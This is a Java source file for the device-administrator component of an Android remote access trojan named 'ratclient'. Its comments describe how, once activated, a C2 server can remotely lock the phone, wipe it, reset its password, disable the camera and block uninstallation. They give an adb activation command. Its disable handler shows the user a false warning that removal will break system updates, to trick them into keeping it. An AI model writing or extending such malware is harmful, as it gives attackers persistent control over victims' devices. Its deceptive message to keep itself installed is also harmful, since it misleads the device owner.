package io.github.ratclient;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

/**
 * RatDeviceAdmin — Device Policy Controller
 *
 * Once activated, enables:
 *   • Lock screen remotely  (DevicePolicyManager.lockNow)
 *   • Factory wipe          (DevicePolicyManager.wipeData)
 *   • Password reset        (DevicePolicyManager.resetPassword — API < 26)
 *   • Camera disable        (DevicePolicyManager.setCameraDisabled)
 *   • Uninstall protection  (can't remove app while admin is active)
 *
 * Activate via:
 *   Intent → ACTION_ADD_DEVICE_ADMIN → shows system dialog to user
 *   Or use: adb dpm set-active-admin io.github.ratclient/.RatDeviceAdmin
 */
public class RatDeviceAdmin extends DeviceAdminReceiver {

    @Override
    public void onEnabled(Context context, Intent intent) {
        // Device admin activated successfully
        // Optionally notify C2 here via a broadcast to RatService
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        // User is trying to remove device admin
        // Return a warning message shown in the system dialog
        return "Disabling this will break system update service.";
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        // Admin was removed — C2 loses lock/wipe capability
    }

    @Override
    public void onPasswordChanged(Context context, Intent intent) {}

    @Override
    public void onPasswordFailed(Context context, Intent intent) {}

    @Override
    public void onPasswordSucceeded(Context context, Intent intent) {}
}
